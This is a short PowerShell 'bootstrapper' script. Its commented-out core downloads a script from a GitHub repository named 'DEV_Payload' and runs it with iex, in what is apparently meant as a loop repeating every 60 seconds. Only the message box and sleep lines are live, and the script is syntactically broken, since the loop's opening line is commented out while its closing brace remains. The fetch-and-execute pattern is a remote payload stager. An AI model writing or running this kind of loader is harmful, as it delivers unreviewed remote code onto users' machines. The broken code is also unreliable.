Add-Type -AssemblyName PresentationFramework
        [System.Windows.MessageBox]::Show("Bootstrapper: new")

 # while ($true) {
    try {
        # Show alert: Starting download

        # Create WebClient
       #   $wc = New-Object System.Net.WebClient
       #   $wc.Headers.Add("User-Agent", "Bootstrapper")

        # Define your URL here
        #  $url = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1"

        # Actually download
       #   $scriptContent = $wc.DownloadString($url)

        # OPTIONAL: Execute it
        # iex $scriptContent

        # Show alert: Download complete
        #[System.Windows.MessageBox]::Show("Bootstrapper: Download complete. Executing...")

        # Show alert: Execution finished
        #  [System.Windows.MessageBox]::Show("Bootstrapper: Execution complete. Waiting 5 seconds...")
    }
    catch {
        # Show alert: Error
       #   [System.Windows.MessageBox]::Show("Bootstrapper ERROR:`n$($_.Exception.Message)`n`n$($_.Exception.ToString())")
    }

    # Wait before next loop
    Start-Sleep -Seconds 60
}
